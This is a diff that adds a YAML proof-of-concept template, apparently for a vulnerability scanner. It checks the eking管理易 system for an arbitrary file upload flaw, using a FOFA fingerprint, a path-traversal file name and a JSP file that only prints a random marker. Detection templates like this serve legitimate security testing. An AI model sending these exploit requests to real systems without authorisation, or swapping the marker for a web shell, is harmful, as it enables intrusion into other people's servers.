@@ -1,0 +1,30 @@
+id: poc-yaml-eking-fileupload-anyfile-upload
+info:
+  name: eking管理易 FileUpload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 管理易
+  fofa: app="EKing-管理易"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+  datetime: datetime("2006-01-02")
+requests:
+- method: POST
+  path: /app/FileUpload.ihtm?comm_type=EKING&file_name=../../{{.t1}}.jsp
+  headers:
+    Content-Type: multipart/form-data; boundary=WebKitFormBoundaryHHaZAYecVOf5sfa6
+  data: '--WebKitFormBoundaryHHaZAYecVOf5sfa6
+
+    Content-Disposition: form-data; name="uplo_file"; filename="rce.jpg"
+
+
+    <% out.println("{{.t2}}");%>
+
+    --WebKitFormBoundaryHHaZAYecVOf5sfa6--'
+  expression: status_code == 200 && contains(body,"\"fileUrl\":")
+- method: GET
+  path: /upload2/{{.datetime}}/../../{{.t1}}.jsp
+  expression: status_code == 200 && trim(body) == t2
+transport: http
